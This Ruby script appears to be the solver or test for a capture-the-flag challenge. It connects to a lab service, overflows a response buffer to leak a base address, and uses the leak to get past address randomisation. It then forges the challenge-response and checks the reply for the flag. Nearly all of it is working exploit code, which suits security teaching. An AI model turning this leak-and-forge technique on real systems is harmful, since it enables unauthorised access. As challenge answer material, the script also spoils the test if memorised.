require 'socket'
require 'yaml'

METADATA = YAML::load(File.read('../metadata.yml'))
EXPECTED_FLAG = METADATA['flag']
DEFAULT_PORT = METADATA['port']

CHALLENGE_LENGTH = 31
RESPONSE_LENGTH = 32
KEY = "THIS_IS_KINDA_SORTA_MAYBE_AN_IV!!"
SEED = 0xabf25330

s = TCPSocket::new(ARGV[0] || '192.168.56.114', (ARGV[1] || DEFAULT_PORT).to_i)

data = ''.force_encoding('ASCII-8BIT')

sleep(0.5)

# Get the start
loop do
  data += s.recv(1)
  if data.end_with?("Challenge: ")
    break;
  end
end

# Get just the challenge
challenge = s.recv(CHALLENGE_LENGTH)
puts "Received the challenge: #{ challenge }"
puts '--'

# Discard
s.recv(1000)

s.write("A" * RESPONSE_LENGTH)
sleep(0.5)

data = ''.force_encoding('ASCII-8BIT')
loop do
  data += s.recv(1)
  if data.end_with?("A" * RESPONSE_LENGTH)
    break;
  end
end

addr = s.recv(9999).gsub(/\x0d\x0a.*/m, '')
#puts addr.unpack('H*')
addr = addr.ljust(4, "\0").unpack('V').pop & 0xFFFF0000
puts("Leaked base address: 0x%08x" % addr)

# Figure out what the actual seed is, based on the memory leak
DESIRED_ADDRESS = 0x00400000
puts("Desired base address: 0x%08x" % DESIRED_ADDRESS)
DIFF = addr - DESIRED_ADDRESS
puts("Difference => 0x%08x" % DIFF)
puts('--')

seed = SEED + DIFF
puts("Desired seed: 0x%08x" % SEED)
puts("After relocating -> 0x%08x" % seed)
puts('--')

puts("Calculating response..........")
0.upto(CHALLENGE_LENGTH - 1) do |i|
  challenge[i] = (((challenge[i].ord ^ (seed & 0x000000FF)) % 0x5f) + 0x20).chr
  seed = ((seed >> 1) & 0xFFFFFFFF) ^ KEY[i].ord
end

puts("Sending response")
s.write(challenge + "\0\0\r\n")
puts('--')
sleep(0.5)

puts("Did we win?")
puts '--'

response = s.recv(1000)
puts response
if response.include?(EXPECTED_FLAG)
  puts "Success!"
  exit 0
else
  puts "Looks like we failed!"
  exit 1
end
